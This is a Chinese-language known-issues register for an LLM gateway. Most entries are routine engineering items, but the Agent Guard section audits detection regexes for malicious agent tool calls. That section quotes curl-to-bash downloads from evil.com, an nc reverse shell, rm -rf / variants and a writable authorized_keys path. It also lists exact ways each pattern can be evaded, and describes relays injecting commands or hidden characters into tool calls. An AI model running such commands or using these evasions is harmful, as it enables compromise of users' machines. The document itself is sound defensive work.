- **现状**：`internal/server/facts.go` 的 `attachmentSpans` 每次调用线性扫描全 body；同一请求的 facts 提取路径上存在多次扫描的形态，大 body（多图/长文）下重复开销。
- **为什么待定**：这是性能项而非安全项——本地单用户运行，客户端即操作员；无超时风险敞口。
- **触发条件**：profile 显示 facts 提取在真实负载耗时中占比可感知。

#### 2.75 [低] 配置 hot-reload 在高频写入下可乱序

- **现状**：`internal/config/watch.go` 的 reload 管线在高频连续写入时，事件到达顺序不保证与写入顺序一致，存在短暂加载到「新产物与旧校验交错」的混合态窗口。
- **当前缓解**：触发面窄（需要亚秒级连续改写 config.yaml），且混合态每次都会重新走完整校验，不是「未校验状态上线」。
- **可能方案**：reload 合并与去抖（debounce）+ 序号丢弃过期事件。
- **触发条件**：出现外部自动化高频改写 config.yaml 的运维形态。

#### 2.77 [低，加固项] 评分层无 NaN 纵深防御

- **现状**：`quota` 评分路径的输入由加载期与写入期校验挡住（NaN/±Inf 进不来），评分本身无二次防御。当前不可达。
- **可能方案**：评分入口加 `math.IsNaN`/`IsInf` 兜底归零。
- **触发条件**：出现绕过既有校验层直接构造 Counters 的新调用方（如未来的导入/迁移工具）。

#### 2.91 [低，决定不做] `Registry.rollbackWarned` 是进程级一次性 latch

- **现状**：`internal/quota/quota.go` `resetIfStaleLocked` 的 `rollbackWarned` 一旦置位便无重置机会，此后宿主机真实 NTP 阶跃/快照回滚/时区误配都不再有 WARN。
- **裁决（不修）**：latch 只控制 WARN 是否打印，对计量行为**零影响**——回退期间计数照常累进且方向**保守**（used 偏高 → headroom 偏低 → provider 被轻微降权），并随下一次周期前移或进程重启**自愈**；残留代价仅是第二次真实回退不再有日志。cost 计费单锁原子化后，误触发的主要来源（周期切换瞬间晚到的估算写携旧 `periodStart`）已消除，真实回退本身罕见。为一条日志引入时间窗/limitKey 状态不值得。若日后真实回退频繁出现且确需逐次告警，再按窗口化去重改。

#### 2.49 [低，非活跃——仅 32-bit] `imgprep` 解压炸弹守卫的像素乘积在 32-bit `int` 平台可溢出

- **现状**：`processImage` 用 `cfg.Width*cfg.Height > maxDecodePixels` 挡炸弹（两值是 `int`）；32-bit 平台两值接近 `int32` 上限时乘积回绕成小值绕过守卫。
- **为什么非活跃**：Go `image/png` 把 IHDR 宽高钳在 `int32`，64-bit（唯一 CI/目标平台）乘积 ≤ (2³¹)² < `int64` 上限，不可能溢出。
- **修法（触发时）**：`int64(cfg.Width) * int64(cfg.Height)`，一行。**触发条件**：32-bit 成为受支持的构建/部署目标。

#### 2.177 [低，登记待触发] Provider 并发限流热重载：容量/排队时长变化时旧信号量在途请求与新信号量短暂叠加

- **现状**：`ProviderLimiterRegistry.Install`（`internal/router/provider_limiter.go`）发现某 provider 的 `concurrency`/`concurrency_queue` 与已安装的旧 `ProviderLimiter` 不一致时，直接用 `NewProviderLimiter` 换一个全新对象，不复用也不迁移旧对象。旧对象上仍在途的 in-flight 请求持有的 release 闭包只绑定旧信号量，释放时只减旧对象的计数；新请求全部走新信号量。热重载后到旧请求跑完这段过渡期内，该 provider 的真实上游并发 = 旧信号量残留的 in-flight + 新信号量已接纳的 in-flight，可能短暂超过刚调低的新 cap。
- **为什么待定**：触发面窄——需要运维方在该 provider 有大量长耗时请求在途时手动调低其并发上限；过渡期随旧请求自然结束自愈，不会持续放大或积累。真要根治需要新旧信号量共享计数/排空的额外机制，复杂度和当前风险不成比例。
- **可能方案（触发时）**：让容量收紧时的旧 `ProviderLimiter` 转入只减不增的"draining"状态，新请求一律路由到新对象；或至少把新旧对象的 `inFlight` 汇总进 `/stats`，让运维能看到过渡期的真实叠加值。
- **触发条件**：真实运维报告在调低某 provider 并发上限后，短时间内观察到该上游侧限流/429 明显增多。

#### 2.178 [低，登记待触发] `failoverTrail.allBusy()` 无法区分"并发闸门 busy"与"health 单飞竞争跳过"，503 消息可能误导

- **现状**：`Serve` 循环（`internal/router/router.go`）里 `rt.Health.Acquire(ep.HealthKey(), ...)` 失败时（半开端点的单飞名额被另一后台探针占住）直接 `continue`，不写入 `trail`；`allBusy()`（`internal/router/routehdr.go`）因此只看得到真正命中并发闸门的 `busy`/`busy_timeout` 条目。若一轮候选里既有因 health 单飞竞争跳过的端点、又有其余候选因并发闸门耗尽，`allBusy()` 仍返回 true，`noCandidatesMessage` 给出的"全部候选都因并发限制 busy"措辞会掩盖其中至少一个其实是 health 竞争问题这一事实。
- **影响面**：仅诊断消息措辞层面，不影响 503 状态码或实际路由/failover 行为；且需要两种窄场景（半开单飞竞争 + 其他候选并发耗尽）同轮命中才会出现。
- **为什么待定**：给 health 竞争跳过也记一笔 trail 需要设计新的条目形态（避免和真正的 busy 混淆，也要避免把正常的探针单飞竞争渲染成 `X-VMR-Failover` 里看起来异常的一项），成本与当前触发概率不成比例。
- **触发条件**：真实运维反馈 503 消息与实际候选状态明显对不上（例如日志显示某端点本身健康、只是被探针占位，而消息说它 busy）。

### F. 工程工具与运维入口

#### 2.54 [低，暂不做] `/help.html` 页内发测试请求

- **现状**：`/help.html`（`internal/server` 里的双语内嵌页）已有一键复制各 Agent 接入片段、鉴权弹窗、`fetch('/status')` 健康展示。「页内直接发一次测试请求看命中节点/延迟」在技术上可行——`X-VMR-Endpoint`/`X-VMR-Attempts`/`X-VMR-Route-Reason` 响应头已具备。
- **为什么暂不做**：真实工作量约 1–1.5 人日（双语内嵌 HTML 锁步、真实计费请求、streaming、错误面、虚拟模型选择器、内嵌 JS 无 Go 测试）。这是 onboarding 漏斗功能，被 `vmr init`/`vmr connect` 完全压制——真做漏斗应先做那两个。Strategy 文档里本就列在第三梯队。

#### 2.80 [低] `sysinfo` 把系统调用失败折叠成 0，违反「missing is not zero」

- **现状**：`internal/sysinfo` 的 `DirTotalSize`/`DiskFreeBytes` 在目录不可读或调用失败时返回 0——与「磁盘真的满/目录真的为空」在返回值上不可区分，状态看板可能把「读不到」显示成「用量为零」。
- **为什么待定**：消费方是本地状态展示，错误折叠的误导面小；真正「missing is not zero」的纪律挂在会进报表与配额决策的数字上。
- **可能方案**：返回 `(value, ok)` 并让消费方显式展示 unknown。
- **触发条件**：状态看板数字开始参与任何自动决策（而不仅是人看）。

#### 2.101 [低，待观察] Overview 告警 pill 的 quota 阈值上线后看噪音再调

- **现状**：quota 告警阈值写死在 `server/alerts.go`（used ≥ 100% → error；≥ 90% → warning），是实施轮主控拍板值（依据见 console-unification 设计契约（已归档））。
- **为什么待定**：阈值本身没有权威来源（quota 评分曲线只有 headroom=1 一个语义分界），90% 是否过吵取决于真实用量曲线；先跑真实流量再定，不预调。
- **触发条件**：告警 pill 长期非零但无实际可操作事项（噪音），或濒临耗尽从未提前告警（漏报）。

#### 2.102 [低，待决] recent_errors 与 Log 页之间无进程内请求号关联

- **现状**：曾提出过 Recent Failures 条目保留进程内请求号、与 Log 页每行同号互跳的设计；但 audit.Record 与 `/log` 行目前都不携带任何请求号，实施轮未为它加字段（加号牵动 audit 格式与日志消费者，越界）。
- **可能方案**：给 Record 加进程级 seq 并在 logfmt 前缀携带（成本：日志格式变更 + audit schema 演进 + report 兼容）；或接受无关联（Log 页有子串过滤可按时间窗人工对齐）。
- **为什么待定**：关联的实际排障收益未经验证，而格式变更成本确定。

#### 2.104 [低] 拓扑表 Headroom 列只反映 bucket limit，不反映更紧的 gate

- **现状**：`endpointHeadroom`（`server/alerts.go`）在账户无 limit 触顶时返回 **bucket limit** 的 headroom（经 `quota.BucketIndex` 选定），不取账户所有 applicable limit 里最小的那个。于是一个被近饱和的短周期 gate 限流的账户，端点行 Headroom 仍显示绿色的 bucket 值——比它实际的路由有效余量乐观。差分测试钉住的是"端点 headroom == 对应 QuotaStatus 行的 headroom（同源）"，没钉住"选的是哪一行"。
- **为什么可接受**：与 Quota Budgets 表一致（那张表也逐 limit 各显各的 headroom）；gate 的紧迫感设计上由 Quota 表的 Progress 红条承担。端点表没有 Progress 列是这条的短板。
- **可能方案**：改取 applicable limit 里 headroom 最小者；或端点表补一个迷你 gate 指示。
- **触发条件**：运维因端点 Headroom 显示健康而没预判到 gate 限流。

#### 2.105 [低] `/status` 告警 `ref`（`provider:key_label:model`）在同名 provider 跨协议组复用时不唯一

- **现状**：同一个 provider 名可以同时出现在 `providers.openai` 与 `providers.anthropic` 下（`core.Endpoint.HealthKey` 的文档明确支持）。这两个是不同端点、各有独立健康状态，但告警 `ref` 只有 `provider:key_label:model` 三段，会撞在一起；`endpointAlerts` 按 `ref+message` 去重、`statusAlerts` 末尾 `sort.SliceStable` 遇到 `(severity,kind,ref)` 全等时保留 map 迭代序 → 同 ref 的多条告警排序在两次请求间可能不稳定。拓扑表不受影响（它按虚拟模型分组，协议在组首行可见）。
- **可能方案**：`ref` 加协议前缀（`anthropic-messages:provider:key_label:model`），或去重键并入 `HealthKey`。
- **为什么待定**：需要这种少见配置 + 影响仅是告警列表排序抖动，非功能错误。

#### 2.98 [低，待触发] `archtest` 的 `funcLineExemptions` 以「文件:函数名」为键，同文件重名方法共用一条

- **现状**：同文件重名方法（如 `report/ingest.go` 的多个 `Ingest`）共用一条豁免。今天全部远低于默认限额，无影响；一旦为其一登记豁免，其余会一并放宽。
- **可能方案**：键改「文件:接收者类型.函数名」（`ast.FuncDecl.Recv` 已有类型信息）。
- **为什么待定**：需真的出现一个必须豁免的重名方法才有意义。

#### 2.153 [中，待评估] `internal/ctxgraph` 在 `-race` 下可能撞上 Go 默认 600s 单包超时

- **现状**：`go test ./internal/ctxgraph/... -race`（Apple M4，无其他负载竞争）实测稳定耗时
  超过 600 秒并被 Go 判为超时失败（`go test ./internal/ctxgraph/...` 不含 `-race` 本身已要
  173.8 秒、427% CPU——这是一个天然偏重的测试套件，`-race` 的数倍开销把它推过默认超时线）。
  在 Agent Guard M3 前置摸底阶段发现，`internal/ctxgraph` 与本轮改动的
  `guard`/`config`/`report` 均无依赖关系，判定为与 Agent Guard 无关的独立发现。
- **为什么值得关注**：`.github/workflows/ci.yml` 的 CI 步骤是裸的 `go test -race ./...`，未设
  `-timeout`，完全依赖 Go 默认的 10 分钟单包超时——本地一台高核数 Apple Silicon 尚且压线，
  GitHub Actions 的标准 runner（核数更少、单核更慢）大概率会更慢，即这条 CI 步骤有实际
  概率间歇性甚至持续性失败，且失败信息（大段 goroutine dump）不会直接指向"只是超时"，
  容易被误判为真实死锁/竞态。
- **未验证**：是否为近期改动引入的新回归（需要 `git bisect` 或对旧提交重跑本命令核实），
  还是这套件一直如此、只是从未有人在 `-race` 下单独计时过；是否在 GitHub Actions 的真实
  CI 环境里已经在发生。
- **可能方案**：给 CI 的 `go test -race ./...` 显式加 `-timeout`（更简单，先止血）；或定位
  `internal/ctxgraph` 具体哪些用例耗时最长并拆分/精简（含是否可关闭部分子测试的
  `-race`，如纯 CPU 密集的语料回归不必每次都在 race detector 下跑）。
- **触发条件**：CI 上出现 `internal/ctxgraph` 的间歇性超时失败时，直接用本条登记的复现
  命令确认是否同一成因，而不必重新排查一遍。

#### 2.179 [低，观察] 文档引用守卫对「无 `.md` 路径的裸文档名引用」与「非 `.go` 资产头注释」结构性不可达

- **现状**：archtest 的文档引用守卫只扫描生产 `.go` 文件注释中**形似路径**的引用
  （`docs/...`、`*.go` 等）。两类真实悬空引用它抓不到：① 注释里不带 `.md` 路径的裸文档名
  ——`internal/livestats`/`internal/server` 曾有约 15 处 `(contracts §1.x)` 注释指向
  gitignored 的 `_subtasks/console-unification/contracts.md`，2026-09-21 清理轮修掉了
  全部字面含 `contracts.md` 的引用后，这一族仍整组存活（grep 字面串的方式对它们天然盲）；
  ② 非 `.go` 的 embed 资产头注释——`internal/server` 下的 `help.html`/`help.zh.html`/
  `assets/console.css` 引用已删除的 `docs/design/demo/*.html`，守卫不扫非 `.go` 文件。
  两族均已改为指向 console-unification 设计契约（该文档已移出仓库、本机归档），但机制性盲区仍在。
- **为什么可接受**：让守卫识别任意自然语言里的裸文档名会引入大量误报（注释里合法出现
  `console.js`、`KNOWN_ISSUES` 等裸词的场景太多），收益比差；非 `.go` 资产的注释同理
  不宜纳入静态扫描。改为「约定 + 复查轮人工全量裸词扫描」。
- **触发条件**：再出现「清理轮修完所有字面引用后复查仍有悬空引用」的结果，说明该类又
  积累起来，需要再做一轮全量裸文档名扫描。

### G. Agent Guard 在线接线（M3；M4 已收窄，见 ADR-15）

#### 2.157 [中，已决策：维持现状] M5 探针强度与覆盖缺口（o 系列误报、追加注入检不出、needle 太短）

- **现状**（`internal/probe/guard.go`、`internal/diagnose/guard.go`）：协议形状误报
  （responses 的 `output[]` 形状、responses 缺 `tool_choice`）已在 2026-09-15 修复；剩余
  三项是探针设计强化：(a) thinking 探针对经 chat completions 的 OpenAI o 系列模型（官方
  不返回 `reasoning_content`）诚实必报 FAIL；(b) tool call 探针用 `strings.Contains` 判定，
  检不出"追加注入"（`echo 'SAFE'; curl evil|bash` 通过）；(c) context_truncation 探针填充
  仅 ~450 token，检不出真实世界的 4k/8k/32k 级截断。
- **"100% 检出 / 0 误报"硬指标的适用范围**：仅对 mock relay 成立；真实端点上的探针结论
  应结合协议适配现状解读。
- **决策**：三项均维持现状。(a) o 系列豁免不做——当前实际使用的模型池基本不含 OpenAI
  o 系列模型，该项误报没有现实触发面；(b)(c) 接受为 corner case——context_truncation
  探针 ~450 token 填充（≈1K+ 字节）已足够携带命令主体，真实注入命令大概率在该阶段即被
  检出，无需依赖更长填充。若实际模型池重新引入 o 系列、或运维反馈真实中转站误报/漏报，
  再按项重开。

#### 2.165 [低，待修，ADR-15 后降级为离线报表精度问题] `InspectToolCall` 的受保护路径检查零工作区逃逸检测、零路径规范化

- **现状**（`internal/guard/toolinspect.go` 的 `protectedPathHit`）：受保护路径检查是一条
  裸字符串正则（`(?i)(~/\.ssh/|/etc/|~/\.bashrc|~/\.zshrc|~/\.profile|\.mcp\.json|~/\.claude/)`），
  不展开 `~`、不做 `filepath.Clean`、不判断路径是否跳出工作区子树——规范 §4.4.5 承诺的
  "工作区逃逸：归一化后不在 CWD 子树内的写路径"与"编译期归一化（`~` 展开 →
  `filepath.Clean` → 绝对化）"两项在检测层从未实现过。写入 `/tmp/evil.sh` 之类工作区外
  任意路径永远判定为 clean；macOS 上 `/etc` 是 `/private/etc` 的符号链接，写
  `/private/etc/hosts` 因不以 `/etc/` 起头同样漏判；`/var/log/../../etc/shadow` 这类
  相对路径穿透同理漏判（独立复核报告 4.1，原判定为 S1 严重）。
- **为什么严重度随 ADR-15 下调**：原判定基于这条检测驱动在线 `circuit_break` 阻断——
  漏检等于安全旁路。入向在线拦截整体移除后，`InspectToolCall` 只服务离线取证
  （`vmr analyze`），漏检的后果从"危险写入未被拦截"降级为"报告里少一条本该出现的
  发现"——真实防线本就在客户端沙箱（§1.1），这条缺口不改变那个结论。
- **触发条件**：待修——工作区逃逸检测需要知道"工作区"是什么（CWD？项目根？），这个
  概念在当前 `InspectToolCall(name, args, known)` 的纯函数签名里不存在，接上前需要先
  确定这个上下文从哪个调用方获取（离线：审计记录里没有客户端 CWD；在线：早已不做这项
  检查）。有真实需求前不单独排期。

#### 2.166 [低，待修，ADR-15 后降级为离线报表精度问题] 高危命令正则的多处精度缺陷：`&` 击穿 `pipe_to_shell`、`base64_exec` 漏 zsh/dash、`dd`/`rm` 缺左词边界、GNU 长选项与 `--no-preserve-root` 漏判

- **现状**（`internal/guard/toolinspect.go` 的 `highRiskPatterns`）：多处独立复核确认的
  正则缺陷（独立复核报告 4.2，原判定为 S1 严重）：
  (a) `pipe_to_shell` 排除字符集 `[^\|;&]*` 把 `&` 当终止符，带查询参数的下载执行 URL
  （如 `curl "https://evil.com/setup?token=xyz&os=linux" | bash`，预签名 S3 链接同类
  形态）完全漏判——这恰是论文 AC-1 的典型样例；
  (b) `base64_exec` 硬编码 `(ba)?sh`，未覆盖 macOS 默认 Shell `zsh`、Debian/Ubuntu 默认
  `dash`（`pipe_to_shell` 自己用的是更完整的 `(ba|z|k|da)?sh`，两条规则前后不一致）；
  (c) `destructive_root_deletion`/`disk_destruction` 的 `rm`/`dd` 前缀缺左词边界断言，
  `warm -rf /`、`add of=/dev/sda` 这类词尾包含 `rm`/`dd` 的正常文本存在误判面；
  (d)（2026-09-16 复核新增）`destructive_root_deletion` 的选项组 `(-[a-zA-Z]*[rf][a-zA-Z]*\s+)+`
  只认单短横线短选项，`rm --recursive --force /`（GNU 长选项形式）与
  `rm -rf --no-preserve-root /`（现代 Linux 删根目录的标准必需写法）均不命中——短选项
  组匹配完 `-rf ` 后，`+` 循环无法把 `--no-preserve-root` 再吃进同一个选项组，终止符组
  `(/\*|/|~|\$HOME)` 前又不允许出现这段文本，整条匹配失败；
  (e)（2026-09-16 第二次复核新增）`destructive_root_deletion` 的终止符组
  `(\s|"|$)` 不包含 Shell 常见链式分隔符 `;`/`&`/`|`/`)`，也不包含 JSON 转义换行
  （`\n` 在解码后是字面 `\` + `n` 两个字符，不是空白）——`rm -rf /; echo pwned`、
  `rm -rf /&& ls`、`(rm -rf /)`、命令中间嵌一个转义换行的多行脚本均不命中；
  (f)（2026-09-16 第三次复核新增）`destructive_root_deletion` 不认引号包裹的路径：
  选项组 `(-[a-zA-Z]*[rf][a-zA-Z]*\s+)+` 后要求直接紧跟 `(/\*|/|~|\$HOME)`，真实
  生成命令常见的 shell 引号保护写法（`rm -rf "/"`、`rm -rf '$HOME'`）在路径前多出
  一个引号字符，导致整条不命中；
  (g)（2026-09-16 第三次复核新增）`pipe_to_shell` 的排除字符集 `[^\|;&]*` 把任何
  中间管道都当终止符——下载后先经过合法过滤工具再执行的命令（`curl ... | grep -v
  debug | bash`、`curl ... | tr -d '\r' | sh`）在第一个中间 `|` 处就失配，比 (a) 的
  `&` 漏判更基础、覆盖面更广，这恰是论文 AC-1 场景里管道链的常见形态；
  (h)（2026-09-16 第四次复核新增）`reverse_shell` 的 `nc` 分支要求
  `(-[a-zA-Z]*e[a-zA-Z]*\s+)?/bin/(ba)?sh` 紧跟在 `nc\s+` 之后，但真实反弹 shell
  最常见的写法是主机与端口在前、`-e` 选项在后（`nc 10.0.0.1 4444 -e /bin/sh`），
  这种参数顺序完全不命中；程序名也只认 `nc`/`nc.traditional`，遗漏广泛安装的
  `ncat`（Nmap 套件）与 `netcat`；
  (i)（2026-09-16 第四次复核新增）`base64_exec` 的 Python 分支只认
  `\b(exec|eval|pty\.spawn)\b`，遗漏真实投毒载荷里最常见的执行原语——
  `python3 -c "import os; os.system('curl ...')"`、`subprocess.run([...])`、
  `os.popen('...').read()` 均不含 `exec`/`eval`/`pty.spawn` 字面词，整条漏判。
- **为什么严重度随 ADR-15 下调**：与 §2.165 同理——原判定基于这条检测驱动在线
  `circuit_break`，(a)(b)(d)(e)(f)(g)(h)(i) 八项漏检等于安全旁路；移除在线拦截后，
  后果降级为离线报表漏报/误报，不改变"真实防线在客户端沙箱"的结论。
- **触发条件**：待修——(a)(b)(d)(e)(f)(g)(h)(i) 属于真实漏报，值得排期修正（改起来
  风险可控：收紧排除集、补齐 shell 别名、给选项组加一条可选的长选项分支、把终止符组
  扩充为 `([\s;&|)"\\]|$)`、允许路径前的可选引号、放宽管道目标的中间过滤链、放宽
  `nc`/`-e`的参数顺序并补齐 `ncat`/`netcat`、给 Python 分支补
  `os\.system`/`subprocess`/`os\.popen` 等执行原语，均不涉及架构改动）；(c) 的
  误判面较窄（真实语料未见触发），可以一并搭车但不单独立项。均需先用
  `tools/guard_corpus_scan` 对本仓语料重新校准，确认修正不引入新的误报（同 §2.3
  的校准方法论）——这也是历次复核发现新缺口后均未直接改正则的原因：先校准，再改，
  不能反过来。

#### 2.167 [低，决定不补] `ToolVerdict.Excerpt` 不做启发式脱敏，`pipe_to_shell` 命中可能带出 URL 查询串里的令牌

- **现状**（`internal/guard/toolinspect.go` 的 `trimExcerpt`/`InspectToolCall`）：Excerpt
  是高危命令库/受保护路径正则匹配到的命令或路径**语法**子串本身，不是凭据——`Echoed`
  已经用 bool 信号单独承载凭据回显，从不复制凭据。但 `pipe_to_shell` 一类模式
  （`(curl|wget)\s+[^\|;&]*\|\s*(sudo\s+)?(ba|z|k|da)?sh\b`）把整条命令行原样收进匹配
  子串；若下载 URL 的查询串里恰好带着令牌（预签名链接、`?token=...`），那段文本会跟着
  进 Excerpt，未经任何屏蔽。
- **为什么决定不补**：与 §1.2(b)/ADR-5 同一立场——"脱敏是追不全的黑名单"完全适用于
  这里，"URL 参数里哪一段是敏感令牌"本身就是一个开放式形状识别问题，给 Excerpt 加一层
  启发式打码，换来的是又一份猜不全的黑名单，而不是真正的脱敏。真正识别凭据的是
  `Engine.Scan` 的五锚 Tier 1 规则（§2.3 结论 2），Excerpt 的定位一直是"人工复核时看到
  匹配到了什么语法"，不是"绝对不含任何敏感字节"的容器。
- **触发条件**：待观察——真实语料至今未见 `pipe_to_shell` 命中的 URL 携带凭据形态的
  令牌（§2.3 的语料扫描范围不含这类组合）；若未来校准语料证实这是高频场景，再评估收窄
  `pipe_to_shell` 的捕获组（只保留协议+域名，丢弃查询串）而不是引入打码启发式。

#### 2.169 [低，架构定调] trusted_providers 仅作为在线路由不阻断放行名单，离线安全取证坚持全量感知并归因

- **现状**（`internal/server/guard.go`、`internal/report/guardscan.go`）：在线出向干预中，若虚拟
  模型的全部候选端点均属于 `trusted_providers`，`server.applyOutboundGuard` 判定豁免，跳过在线
  扫描且不盖章（`rec.Guard == nil`）。离线 `vmr analyze` 运行时，因分析半区不导入路由配置（CLAUDE.md
  “两个半区，一份契约”），`factscache.go` 将所有 `rec.Guard == nil` 的记录进行离线补扫，并在
  `macro/guard.json` 的“Provider 暴露面归因”表中将敏感信息外泄列到该可信上游名下。此前
  `server/guard.go` 注释曾称“auditing a request ... adds nothing”，与离线行为产生语义冲突。
- **架构裁决（维持现状，符合安全第一性原理）**：**信任上游不等于不感知外泄**。
  (a) `trusted_providers`（如内网私有部署的 vLLM 或官方直连）的本质是**在线业务放行**——用户知情
  且授权将请求发往该端点，网关不应以 400 阻断打断正常业务链路；
  (b) **离线安全取证的使命是客观呈现事实**——开发者与审计人员在事后报表中依然需要获知“Agent 将哪些
  凭据发往了哪里”，即使发往内部可信上游也属于有价值的安全水位事实，两者逻辑互不排斥；
  (c) 维持离线全量补扫与归因现状。后续清理 `server/guard.go` 等处过时的“adds nothing”注释，
  统一文档口径。

#### 2.170 [低，待修，同 §2.166 校准流程] `ClassifyToolName` 的 command 词根表覆盖不足，`exec`/`run`/`cli`/`eval` 等常见工具命名会被误判为 `unknown` 而跳过高危命令库

- **现状**（`internal/guard/toolinspect.go` 的 `ClassifyToolName`）：判词表是
  `bash`/`shell`/`terminal`/`cmd`/`powershell`/`run_command`/`execute`/`_exec`
  （外加独立的 `sh` 词边界判断）。裸命名为 `exec`（无下划线）、`run`、`run_cmd`
  以外的 `run` 系（`Contains("run_cmd", "cmd")` 能命中，裸 `run` 不能）、`cli`、
  `system`、`eval` 等真实存在的 MCP/Agent 工具命名不含表中任一词根，会落入
  `unknown` 类别——按 K-G6 的既定设计，`unknown` 只做凭据回显检查，不跑
  `highRiskPatterns`，等于这类命名的工具完全绕过高危命令检测。最直白的例子
  （2026-09-16 第四次复核新增）：工具直接命名为 `command` 本身也不命中——`"command"`
  含 `c-o-m`，不含 `"cmd"`（`c-m-d`）这个精确子串，也不含 `"run_command"`。
- **为什么不直接扩表**：`ClassifyToolName` 是子串匹配，词根越短越容易反向误伤——
  裸加入 `"cli"` 会把 `clipboard`、`client_info` 一类正常工具名也误判为 command
  类（对离线报表而言是新的误报源，不是漏报修复）；`"run"`/`"eval"` 同理有自然语言
  子串风险。这与 §2.166 系列同源：改动本身简单，但正确的词边界/权衡需要真实语料
  校准，不能凭空拍脑袋扩表。
- **触发条件**：待修——用 `tools/guard_corpus_scan` 跑一遍本仓真实工具调用名分布，
  确认新增词根（含是否需要词边界而非裸子串）不会对现有工具名产生新误判后再改，
  与 §2.166 同一流程，可合并排期。

#### 2.171 [低，设计口径待登记] 入向在线净化不碰 JSON key，离线取证统计 `tc.Args` 全文（含 key）——两者对"隐写字符位置"的口径不对称，未在文档里定调

- **现状**：`internal/guard/sanitize.go` 的 `sanitizeWalkObject`
  （`i, ok = jsonscan.SkipJSONString(raw, i) // the key itself is never sanitized`）
  只对 JSON 字符串**值**做隐写字符净化，键名从不改写——这是代码注释里的既定行为，
  但从未进入本文件或设计文档正式登记，理由（大概率是"改写键名有更高概率破坏客户端
  按精确键名做的反序列化匹配"）只存在于那一行注释里。`internal/report/guardscan.go`
  的 `scanInbound` 对工具调用离线取证时，`guard.ClassifyRunes([]byte(tc.Args), ...)`
  是对整个实参 JSON 文本（键 + 值）做分类统计，不区分位置。
- **实际后果**：若中转站在 Tool Call 参数的 JSON 键名里塞入隐写字符（如
  `{"\u200bparam": "val"}`），在线净化不会剥除，客户端原样收到；离线扫描会把这段
  残留字符计入 `InboundRunes`，而在线 `SanitizedRuneCounts` 对这次事件是 0——报表
  会呈现"客户端收到了隐写字符"但"净化剥除表"里这一条计 0 次。这与 K-G25 登记的
  "`RuneCounts`/`SanitizedRuneCounts` 本就是互补而非重叠的两件事"是同一道理，不是
  数据矛盾；键名这个具体来源只是从未被明确点名过。
- **为什么不直接改代码**：值得先确认这是不是故意的设计取舍——改写工具调用参数的
  JSON 键名本身就有更高的"破坏客户端 schema 匹配"的风险，且一个键名本就不匹配
  预期字段名的隐写载荷，无论在线剥不剥它，客户端原本的字段绑定大概率已经失败，
  剥不剥字符对下游解析结果影响存疑——这是否值得为此扩大 ADR-2 第 6 项偏离的改写
  范围，是一个需要先想清楚再动代码的设计问题，不是简单的 bug。
- **触发条件**：待定调——若确认"值净化、键不动"是维持的设计取舍，把这条的结论
  收作正式条目（本条目本身即完成了这个登记，后续只需补一句"维持现状"的裁决）；
  若认为键名也该纳入净化范围，需要先评估对客户端 JSON 反序列化的实际影响面，
  再排期实现与回归测试。

#### 2.172 [低，待修，同 §2.166 校准流程] `writeToolNameFragments` 缺少 `save`/`append`/`put`/`insert` 等常见保存动词，导致非标准命名的写入工具跳过受保护路径审查

- **现状**（`internal/guard/toolinspect.go` 的 `writeToolNameFragments`）：判词表仅
  `write`/`create`/`edit`/`replace`/`patch` 五个词根。真实 Agent 生态里常见的保存类
  工具命名——`save_file`、`save`、`append_to_file`、`put_file`、`insert_content`
  等——不含表中任一词根，`ClassifyToolName` 会将其归为 `unknown`（不含 command 词根，
  也不含 network 词根），既不跑 `highRiskPatterns`，也不跑 `protectedPathHit`——一次
  写入 `~/.ssh/authorized_keys` 的持久化攻击，只要工具恰好叫 `save` 而不是 `write`，
  在离线报表里就完全不可见。
- **为什么不直接扩表**：与 §2.170 同源——子串匹配词根越短越容易反向误伤（`put` 一类
  三字母词根尤其容易命中无关工具名），需要先用真实语料校准再决定具体加哪些词、是否
  需要词边界。
- **触发条件**：待修——与 §2.170 合并排期，用 `tools/guard_corpus_scan` 跑一遍本仓
  真实工具调用名分布后一并处理，不单独立项。

#### 2.174 [低，依赖既有 CacheSchemaVersion 纪律] `guardScanSafe` 的 panic 失败态随 Facts 缓存落盘，修复扫描逻辑后若忘记 bump CacheSchemaVersion 则不会重扫

- **现状**（`internal/report/factscache.go`、`guardscan.go` 的 `guardScanSafe`）：扫描
  抛 panic 时，`extractRecordFacts` 把 `GuardScanFailed: true`、`GuardScan: nil` 一起写进
  `recordFacts` 并落盘缓存（按审计文件内容哈希键入）；只要文件内容不变，后续运行会一直
  命中缓存、复用这份空结果，不会重新尝试扫描。
- **触发条件评估**：这条路径是 `internal/report/aggregate.go` 的单 goroutine 顺序扫描，
  不存在并发竞态；Go 的真实内存耗尽是 `fatal error: runtime: out of memory`，不会被
  `recover()` 捕获，走不到这条"失败态"分支——能触发 panic 的现实原因只有"某条记录的
  具体字节内容命中了正则/熵计算里的确定性 bug"，这种 panic 是内容决定性的，同一份日志
  文件下次重跑一定复现，缓存记住它并不冤枉。唯一的风险窗口是：开发者修了这个 bug，但
  没有像 K-G19（Salt→确定性哈希那次）一样同步 bump `internal/ctxgraph.CacheSchemaVersion`，
  导致修复后的记录仍然复用修复前缓存下来的空结果——这是整个 Facts 缓存体系的通用纪律
  （"改抽取逻辑就要 bump 版本号"），不是 guard 扫描独有的缺口，`recordFacts.Guard`
  字段自己的注释也依赖同一条纪律。
- **决定**：不加专门的"失败态不缓存 / 加载时重扫"的特殊逻辑——现实触发概率低，且已有
  通用机制兜底。提醒：未来任何一次修复 guard 扫描内 panic 的改动，记得检查是否需要
  bump `CacheSchemaVersion`。

#### 2.175 [低，登记待办，需先重新校准] Tier 1 规则正则缺右边界锚点，超长标识符理论上可能被前缀命中

- **现状**（`internal/guard/guard.go` 的 `NewRule`、`rules.go` 的 `DefaultRules`）：每条
  规则编译为 `leftBoundary + "(" + body + ")"`，只强制左边界，不加右边界断言；
  `Engine.Scan`/`ScanText` 走 `FindAllSubmatchIndex`（无锚定搜索）。多数 Tier1 规则的
  `body` 用精确长度量词（如 `AKIA[0-9A-Z]{16}`、`ghp_[A-Za-z0-9]{36}`），理论上一个更长
  的、恰好以同样字面前缀开头且随后 N 位落在同一字符集内的标识符会被前 N 位前缀命中，
  熵门只检查被捕获的那一段、救不了这种情况。
- **不是违反 ADR-5**：Agent Guard 设计规范（已归档）
  ADR-5）"五重锚定"里的"定长"锚，原文允许"固定或有明确下界（≥20 字符）"，从未把右
  边界列为第五个锚——这是一项值得考虑的额外加固，不是修一个违反现行规范的缺陷。
- **现实影响**：real-corpus 标定（`tools/guard_corpus_scan`，附录 A 的校准记录）报告
  Tier1 FP=0，这个理论碰撞至今没有在真实语料里出现过；真要加右边界还需要重新跑一遍
  标定确认 FP 仍为 0，不是零风险的编译期改动。
